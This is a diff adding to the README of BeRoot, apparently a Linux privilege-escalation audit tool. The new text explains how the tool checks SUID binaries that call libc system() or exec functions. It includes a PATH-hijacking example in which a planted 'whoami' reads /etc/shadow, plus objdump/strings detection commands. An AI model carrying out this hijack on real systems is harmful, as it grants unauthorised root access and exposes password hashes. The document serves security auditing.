@@ -132,12 +132,45 @@ SUID (Set owner User ID up on execution) is a special type of file permissions g
 BeRoot prints all suid files because a manually analyse should be done on each binary. However, it realizes some actions: 
 * checks if we have write permissions on these binary (why not ? :))
 * checks if a GTFOBins is used as suid to be able to execute system commands using it (remember you could have suid GTFOBins without beeing able to exectute commands - checks GTFOBins section with the false positive example using __mount__). 
-
+* checks if system function (from libc) is used. If so, try to check if a bin is called without using an absolute path (some false positive could occurs in this check). For more information check the PATH environment variable section.  
+* checks if an exec function (from libc) is used. If so, try to find a file with writable access. 
+   
 To analyse manually, checking for .so files loaded from a writable path should be a great idea (this check has not been implemented on BeRoot): 
 ```
 strace [SUID_PATH] 2>&1 | grep -i -E "open|access|no such file"
 ```
 
+Path Environment variable
+----
+system will call the shell (sh) to execute the command sent as an argument.
+
+For example, if a C program calls the system function like so: 
+```
+#include<unistd.h>
+void main()
+{
+	setuid(0);
+	setgid(0);
+	system("whoami");
+}
+``` 
+The binary whoami can be hijacked with the PATH environment variable like so: 
+```
+cd /tmp
+echo "cat /etc/shadow" > whoami
+chmod 777 whoami
+export PATH=/tmp:$PATH
+```
+For more information, checks these two examples [here](https://0xrick.github.io/hack-the-box/zipper/#privilege-escalation-and-getting-root) and [here](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).
+
+To detect it, on each suid binary, we try to find the system call using objdump. 
+```
+objdump -T suid_bin | grep " system"
+```
+
+If it exists, we realise a `strings` on this binary, and try to found a string which does not use an absolute path and that it exists as a built in binary (/bin, /usr/bin, /sbin, etc.). Some false positive can occur, so a manual check should be done.     
+
+This cannot be done if exec functions are used (execve|execl|execlp|execle|execv|execvp|execvpe) because the file should be run from an absolute path. 
 
 NFS Root Squashing
 ----
